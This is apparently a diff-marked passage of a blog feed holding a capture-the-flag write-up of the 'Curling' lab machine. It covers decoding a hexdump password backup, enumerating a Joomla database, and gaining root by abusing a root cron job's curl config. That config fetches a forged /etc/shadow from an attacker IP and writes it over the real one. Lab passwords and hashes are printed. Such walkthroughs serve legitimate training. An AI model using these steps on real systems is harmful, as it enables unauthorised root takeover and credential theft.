-  <li>a folder called <code class="language-plaintext highlighter-rouge">admin_area</code> where only <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">floris</code> can see its contents.</li>
-</ol>
-
-<p><img src="/assets/curling/Floris-Home.jpg" alt="Floris-Home" /></p>
-
-<h3 id="reversing-a-hexdump-and-decompressing-multiple-layers">Reversing a hexdump and Decompressing multiple layers</h3>
-
-<p>so we take a look at the contents of <code class="language-plaintext highlighter-rouge">password_backup</code> and see what looks like a <strong>hexdump</strong>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/home/floris$ cat password_backup 
-00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..
-00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
-00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
-00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
-00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
-00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
-00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
-00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x
-00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....1
-00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
-000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
-000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
-000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
-000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
-000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
-000000f0: 819b bb48 
-</code></pre></div></div>
-
-<p><em>after some quick research on “how to read contents of a hexdump”,</em> we find that we need to use the <code class="language-plaintext highlighter-rouge">xxd</code> tool with the <code class="language-plaintext highlighter-rouge">-r</code> flag to convert the file to a binary.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ xxd -h
-Usage:
-       xxd [options] [infile [outfile]]
-    or
-       xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]
-Options:
-    -a          toggle autoskip: A single '*' replaces nul-lines. Default off.
-    -b          binary digit dump (incompatible with -ps,-i,-r). Default hex.
-    -c cols     format &lt;cols&gt; octets per line. Default 16 (-i: 12, -ps: 30).
-    -E          show characters in EBCDIC. Default ASCII.
-    -e          little-endian dump (incompatible with -ps,-i,-r).
-    -g          number of octets per group in normal output. Default 2 (-e: 4).
-    -h          print this summary.
-    -i          output in C include file style.
-    -l len      stop after &lt;len&gt; octets.
-    -o off      add &lt;off&gt; to the displayed file position.
-    -ps         output in postscript plain hexdump style.
-    -r          reverse operation: convert (or patch) hexdump into binary.
-    -r -s off   revert with &lt;off&gt; added to file positions found in hexdump.
-    -s [+][-]seek  start at &lt;seek&gt; bytes abs. (or +: rel.) infile offset.
-    -u          use upper case hex letters.
-    -v          show version: "xxd V1.10 27oct98 by Juergen Weigert".
-</code></pre></div></div>
-
-<p>`    -r          reverse operation: convert (or patch) hexdump into binary.`</p>
-
-<p>So we go ahead and do that. And we use the <code class="language-plaintext highlighter-rouge">file</code> command against the output.</p>
-
-<p>It’s very handy when you want to know what file type you’re dealing with.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/home/floris$ xxd -r password_backup &gt; /tmp/hex
-www-data@curling:/home/floris$ cd /tmp/
-www-data@curling:/tmp$ file hex 
-hex: bzip2 compressed data, block size = 900k
-</code></pre></div></div>
-
-<p>It’s compressed using <code class="language-plaintext highlighter-rouge">bzip2</code>. so we go ahead and extract it using <code class="language-plaintext highlighter-rouge">bzip2</code> and the <code class="language-plaintext highlighter-rouge">-d</code> flag. Then again use the <code class="language-plaintext highlighter-rouge">file</code> command to see what we got.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ bzip2 -d hex 
-bzip2: Can't guess original name for hex -- using hex.out
-www-data@curling:/tmp$ file hex.out 
-hex.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
-</code></pre></div></div>
-
-<p>Alright, this time it’s compressed with <code class="language-plaintext highlighter-rouge">gzip</code>. so we use <code class="language-plaintext highlighter-rouge">gzip</code> with the <code class="language-plaintext highlighter-rouge">-d</code> flag for extraction. But we get an error for the file having an unknown suffix. This forces us to rename the file adding a <code class="language-plaintext highlighter-rouge">.gz</code> at the end before retrying. And we follow with yet another <code class="language-plaintext highlighter-rouge">file</code> command.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ gzip -d hex.out 
-gzip: hex.out: unknown suffix -- ignored
-www-data@curling:/tmp$ mv hex.out hex.out.gz
-www-data@curling:/tmp$ gzip -d hex.out.gz 
-www-data@curling:/tmp$ file hex.out 
-hex.out: bzip2 compressed data, block size = 900k
-</code></pre></div></div>
-
-<p>Looks like another round of compression with <code class="language-plaintext highlighter-rouge">bzip2</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ bzip2 -d hex.out 
-bzip2: Can't guess original name for hex.out -- using hex.out.out
-www-data@curling:/tmp$ file hex.out.out 
-hex.out.out: POSIX tar archive (GNU)
-</code></pre></div></div>
-
-<p>And again but this time with <code class="language-plaintext highlighter-rouge">tar</code>. We’re using the flags <code class="language-plaintext highlighter-rouge">-xvf</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ tar -xvf hex.out.out 
-password.txt
-www-data@curling:/tmp$ file password.txt 
-password.txt: ASCII text
-www-data@curling:/tmp$ cat password.txt 
-5d&lt;wdCbdZu)|hChXll
-</code></pre></div></div>
-
-<p>At last we get some ASCII text :D We’re going to try and switch user to <code class="language-plaintext highlighter-rouge">floris</code> using that password.</p>
-
-<p><em>In case you were wondering, I did try reusing the password in <code class="language-plaintext highlighter-rouge">secret.txt</code> but it didn’t work :/</em></p>
-
-<p><img src="/assets/curling/got-floris.jpg" alt="got-floris" /></p>
-
-<p>it was indeed the password for the <code class="language-plaintext highlighter-rouge">floris</code> user :D <em>It would’ve been a bad troll move if it weren’t XD</em></p>
-
-<h3 id="privilege-escalation">Privilege Escalation</h3>
-
-<p>Right off the bat, we check <code class="language-plaintext highlighter-rouge">sudo -l -l</code> for an easy win. But don’t find anything there.</p>
-
-<p>we go the <strong>webroot</strong> and check <code class="language-plaintext highlighter-rouge">configuration.php</code> for some creds. And, we DO find some for the local database:</p>
-
-<p><img src="/assets/curling/configuration.php.jpg" alt="configuration.php" /></p>
-
-<h3 id="db-enumeration">DB Enumeration</h3>
-
-<p>we use the the creds to enumerate the database. but find nothing special there.</p>
-
-<p><img src="/assets/curling/db-login.jpg" alt="db-login" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">mysql&gt; show databases;</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| Joombla            |
-+--------------------+
-2 rows in set (0.00 sec)
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">mysql&gt; use Joombla;</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">mysql&gt; show tables;</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------------------------------+
-| Tables_in_Joombla             |
-+-------------------------------+
-| eslfu_assets                  |
-| eslfu_associations            |
-| eslfu_banner_clients          |
-| eslfu_banner_tracks           |
-| eslfu_banners                 |
-| eslfu_categories              |
-| eslfu_contact_details         |
-| eslfu_content                 |
-| eslfu_content_frontpage       |
-| eslfu_content_rating          |
-| eslfu_content_types           |
-| eslfu_contentitem_tag_map     |
-| eslfu_core_log_searches       |
-| eslfu_extensions              |
-| eslfu_fields                  |
-| eslfu_fields_categories       |
-| eslfu_fields_groups           |
-| eslfu_fields_values           |
-| eslfu_finder_filters          |
-| eslfu_finder_links            |
-| eslfu_finder_links_terms0     |
-| eslfu_finder_links_terms1     |
-| eslfu_finder_links_terms2     |
-| eslfu_finder_links_terms3     |
-| eslfu_finder_links_terms4     |
-| eslfu_finder_links_terms5     |
-| eslfu_finder_links_terms6     |
-| eslfu_finder_links_terms7     |
-| eslfu_finder_links_terms8     |
-| eslfu_finder_links_terms9     |
-| eslfu_finder_links_termsa     |
-| eslfu_finder_links_termsb     |
-| eslfu_finder_links_termsc     |
-| eslfu_finder_links_termsd     |
-| eslfu_finder_links_termse     |
-| eslfu_finder_links_termsf     |
-| eslfu_finder_taxonomy         |
-| eslfu_finder_taxonomy_map     |
-| eslfu_finder_terms            |
-| eslfu_finder_terms_common     |
-| eslfu_finder_tokens           |
-| eslfu_finder_tokens_aggregate |
-| eslfu_finder_types            |
-| eslfu_languages               |
-| eslfu_menu                    |
-| eslfu_menu_types              |
-| eslfu_messages                |
-| eslfu_messages_cfg            |
-| eslfu_modules                 |
-| eslfu_modules_menu            |
-| eslfu_newsfeeds               |
-| eslfu_overrider               |
-| eslfu_postinstall_messages    |
-| eslfu_redirect_links          |
-| eslfu_schemas                 |
-| eslfu_session                 |
-| eslfu_tags                    |
-| eslfu_template_styles         |
-| eslfu_ucm_base                |
-| eslfu_ucm_content             |
-| eslfu_ucm_history             |
-| eslfu_update_sites            |
-| eslfu_update_sites_extensions |
-| eslfu_updates                 |
-| eslfu_user_keys               |
-| eslfu_user_notes              |
-| eslfu_user_profiles           |
-| eslfu_user_usergroup_map      |
-| eslfu_usergroups              |
-| eslfu_users                   |
-| eslfu_utf8_conversion         |
-| eslfu_viewlevels              |
-+-------------------------------+
-72 rows in set (0.00 sec)
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">mysql&gt; describe eslfu_users;</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+---------------+---------------+------+-----+---------------------+----------------+
-| Field         | Type          | Null | Key | Default             | Extra          |
-+---------------+---------------+------+-----+---------------------+----------------+
-| id            | int(11)       | NO   | PRI | NULL                | auto_increment |
-| name          | varchar(400)  | NO   | MUL |                     |                |
-| username      | varchar(150)  | NO   | MUL |                     |                |
-| email         | varchar(100)  | NO   | MUL |                     |                |
-| password      | varchar(100)  | NO   |     |                     |                |
-| block         | tinyint(4)    | NO   | MUL | 0                   |                |
-| sendEmail     | tinyint(4)    | YES  |     | 0                   |                |
-| registerDate  | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
-| lastvisitDate | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
-| activation    | varchar(100)  | NO   |     |                     |                |
-| params        | text          | NO   |     | NULL                |                |
-| lastResetTime | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
-| resetCount    | int(11)       | NO   |     | 0                   |                |
-| otpKey        | varchar(1000) | NO   |     |                     |                |
-| otep          | varchar(1000) | NO   |     |                     |                |
-| requireReset  | tinyint(4)    | NO   |     | 0                   |                |
-+---------------+---------------+------+-----+---------------------+----------------+
-16 rows in set (0.01 sec)
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">mysql&gt; select username,password from eslfu_users;</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----------+--------------------------------------------------------------+
-| username | password                                                     |
-+----------+--------------------------------------------------------------+
-| floris   | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e |
-+----------+--------------------------------------------------------------+
-1 row in set (0.00 sec)
-</code></pre></div></div>
-
-<p>We find only the <code class="language-plaintext highlighter-rouge">floris</code> user there which we happen to already have.</p>
-
-<p>we grab the other password:</p>
-
-<p><code class="language-plaintext highlighter-rouge">public $secret = 'VGQ09exHr8W2leID';</code></p>
-
-<p>and try to <code class="language-plaintext highlighter-rouge">su</code> as <code class="language-plaintext highlighter-rouge">root</code>. But, it’s not going to be that easy :D</p>
-
-<p>Note: Enumerating the database is a step we could have done using the <code class="language-plaintext highlighter-rouge">www-data</code> user of course. But my attention was intrigued more by the <code class="language-plaintext highlighter-rouge">password_backup</code> file and that’s why I went for it first.</p>
-
-<h3 id="detecting-unusual-activity">Detecting unusual activity</h3>
-
-<p><em>After running <code class="language-plaintext highlighter-rouge">linpeas</code>,</em> we don’t find much leads to investigate. So we turn to the folder <code class="language-plaintext highlighter-rouge">admin-area</code> in the <code class="language-plaintext highlighter-rouge">home</code> of the <code class="language-plaintext highlighter-rouge">floris</code> user. And we notice that the files <code class="language-plaintext highlighter-rouge">input</code> and <code class="language-plaintext highlighter-rouge">report</code> have been very recently modified.</p>
-
-<p><img src="/assets/curling/admin-area.jpg" alt="admin-area" /></p>
-
-<p>we check their contents:</p>
-
-<p><img src="/assets/curling/input-report-files.jpg" alt="input-report-files" /></p>
-
-<p>it seems that a <code class="language-plaintext highlighter-rouge">curl</code> command is being executed on the <code class="language-plaintext highlighter-rouge">localhost</code> url <code class="language-plaintext highlighter-rouge">http://127.0.0.1</code> which sends the output into the <code class="language-plaintext highlighter-rouge">report</code> file. We know that because of the error message <code class="language-plaintext highlighter-rouge">WARNING: Failed to daemonise.  This is quite common and not fatal.</code> which is the error you get when you trigger a <code class="language-plaintext highlighter-rouge">PHP reverse shell</code> without a listener.</p>
-
-<h3 id="running-a-quick-test-to-verify-our-hypothesis">Running a quick test to verify our hypothesis</h3>
-
-<p>We can confirm that by starting a listener to see if something connects back.</p>
-
-<p><img src="/assets/curling/running-curl.jpg" alt="running-curl" /></p>
-
-<p>It does happen :D but we need more information to be able to exploit this</p>
-
-<h3 id="pspy">PSPY</h3>
-
-<p>we want to get <code class="language-plaintext highlighter-rouge">pspy</code> (https://github.com/DominicBreuker/pspy) on the victim machine so we can start monitoring what’s goin on inside the system. <code class="language-plaintext highlighter-rouge">pspy</code> is a tool you can use to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. It’s very handy.</p>
-
-<p>after making the binary executable, we start it and notice some very interesting activity going on.</p>
-
-<p><img src="/assets/curling/pspy.jpg" alt="pspy" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">/bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input</code> a user who can read the file <code class="language-plaintext highlighter-rouge">default.txt</code> within the <code class="language-plaintext highlighter-rouge">root</code> folder is getting its contents into the <code class="language-plaintext highlighter-rouge">input</code> file in the home folder of the <code class="language-plaintext highlighter-rouge">floris</code> user.</p>
-
-<p><code class="language-plaintext highlighter-rouge">/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report</code> as we thought, a curl command is being run which outputs to the <code class="language-plaintext highlighter-rouge">report</code> file. But we notice that it uses the <code class="language-plaintext highlighter-rouge">-K</code> flag which lets the curl command read the <code class="language-plaintext highlighter-rouge">input</code> file as its configuration.</p>
-
-<p><img src="/assets/curling/curl-help.jpg" alt="curl-help" /></p>
-
-<h3 id="abusing-curl">Abusing cURL</h3>
-
-<p>we do a search on GTFO Bins (https://gtfobins.github.io/gtfobins/curl/) and find we can get a <code class="language-plaintext highlighter-rouge">file read</code> using <code class="language-plaintext highlighter-rouge">curl</code></p>
-
-<p><img src="/assets/curling/gtfo-curl.jpg" alt="gtfo-curl" /></p>
-
-<p>since we can modify the the <code class="language-plaintext highlighter-rouge">input</code> file, we have pretty good control over the curl command. we try reading the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file</p>
-
-<p><img src="/assets/curling/modify-for-shadow.jpg" alt="modify-for-shadow" /></p>
-
-<p>and we manage to get the <code class="language-plaintext highlighter-rouge">shadow</code> file contents :D so it works!</p>
-
-<p><img src="/assets/curling/got-shadow.jpg" alt="got-shadow" /></p>
-
-<h3 id="getting-a-shell-by-altering-the-shadow-file">Getting a shell by altering the shadow file</h3>
-
-<p><em>alright, with this,</em> we can totally read the <code class="language-plaintext highlighter-rouge">root.txt</code> file. But that wouldn’t be fun :D … we’re going for a shell :D</p>
-
-<p><em>since we can read the <code class="language-plaintext highlighter-rouge">shadow</code> file, and we can use the <code class="language-plaintext highlighter-rouge">curl</code> command’s <code class="language-plaintext highlighter-rouge">output</code> functionality to write as root,</em> we can <strong>forge</strong> our own <code class="language-plaintext highlighter-rouge">shadow</code> version.</p>
-
-<p>we first need to create a <code class="language-plaintext highlighter-rouge">SHA-512</code> hash using <code class="language-plaintext highlighter-rouge">mkpasswd</code></p>
-
-<p><img src="/assets/curling/mkpasswd.jpg" alt="mkpasswd" /></p>
-
-<p>then we need to replace <code class="language-plaintext highlighter-rouge">root</code>’s hash with our own in the <code class="language-plaintext highlighter-rouge">shadow</code> file we got.</p>
-
-<p>notice the <code class="language-plaintext highlighter-rouge">diff</code> between <code class="language-plaintext highlighter-rouge">my_shadow</code> which is our forged one in comparison with <code class="language-plaintext highlighter-rouge">his_shadow</code> which is the one we got from the victim</p>
-
-<p><img src="/assets/curling/shadow-diff.jpg" alt="shadow-diff" /></p>
-
-<p><em>alright, with that set,</em> we will want the <code class="language-plaintext highlighter-rouge">curl</code> command running as <code class="language-plaintext highlighter-rouge">root</code> to read our forged shadow file and write it over the old one.</p>
-
-<p>we can do this by modifiying the <code class="language-plaintext highlighter-rouge">input</code> file like this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>floris@curling:~/admin-area$ cat input 
-url = "http://10.10.16.6/my_shadow"
-output = "/etc/shadow"
-</code></pre></div></div>
-
-<p>we start our <code class="language-plaintext highlighter-rouge">python3</code> webserver and we get a <code class="language-plaintext highlighter-rouge">GET</code> request :D</p>
-
-<p>We then <code class="language-plaintext highlighter-rouge">su</code> as the <code class="language-plaintext highlighter-rouge">root</code> user and get our root shell! :D</p>
-
-<p><img src="/assets/curling/gotcha.jpg" alt="gotcha" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary we find Joomla running on HTTP port 80 and we get a list of usernames from the posts on the main page. Inspecting the home page’s source code, we find a comment about a secret.txt file which happens to be at the webroot. The contents of the file reveal a base64-encoded password which we use to gain administrative access to Joomla using the floris user. We abuse the Joomla Administrator’s ability to edit PHP files to place a reverse shell and gain access as the www-data user. We find a readable hexdump called password_backup in floris’s home folder which we reverse to a binary and decompress to gain the password for the floris user. Detecting unusal activity on the box with pspy reveals a cron job running as root and executing a curl command that reads its configuration from a file we can modify. Abusing curl for privileged read/write access lets us get a shell as root by forging our own /etc/shadow file.]]></summary></entry></feed>
+<p><img src="/assets/Sauna/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary We find a domain controller with IIS running on port 80. It turns out to be the company website and we create a list of usernames from the ‘Meet the Team’ page. We try ASREPRoasing and get creds for a user with PowerShell Remoting capabilities. Enumerating Autologon, we find creds for another user with DCSync privileges which we use to dump all domain NTLM hashes.]]></summary></entry></feed>
